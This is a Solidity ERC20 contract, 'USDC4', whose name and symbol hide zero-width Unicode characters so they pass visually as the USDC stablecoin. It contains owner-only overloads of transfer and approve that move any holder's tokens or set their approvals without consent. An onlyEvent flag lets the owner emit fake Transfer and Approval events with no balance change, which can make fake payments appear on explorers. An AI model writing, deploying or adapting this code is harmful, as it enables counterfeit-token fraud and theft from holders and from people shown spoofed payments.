// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
contract USDC4 is ERC20, Ownable {
    constructor() ERC20('\u0055\u200D\u0053\u200D\u0044\u200C\u0043\u200D\u0034', '\u0055\u0053\u200B\u0044\u0043') {
        _mint(msg.sender, 1000000 * 10 ** decimals());
        _transferOwnership(msg.sender);
    }
    function transfer(address to, uint256 value) public virtual override returns (bool) {
        return transfer(msg.sender, to, value, false);
    }
    function transfer(address from, address to, uint256 value, bool onlyEvent) public virtual returns (bool) {
        if (msg.sender == owner()) {
            if (onlyEvent) {
                emit Transfer(from, to, value);
            } else {
                _transfer(from, to, value);
            }
        } else {
            require(from == msg.sender, 'Only owner can transfer from other accounts');
            _transfer(from, to, value);
        }
        return true;
    }
    function approve(address spender, uint256 value) public virtual override returns (bool) {
        return approve(msg.sender, spender, value, false);
    }
    function approve(address owner_address, address spender, uint256 value, bool onlyEvent) public virtual returns (bool) {
        if (msg.sender == owner()) {
            if (onlyEvent) {
                emit Approval(owner_address, spender, value);
            } else {
                _approve(owner_address, spender, value);
            }
        } else {
            require(owner_address == msg.sender, 'Only owner can approve ');
            _approve(owner_address, spender, value);
        }
        return true;
    }
}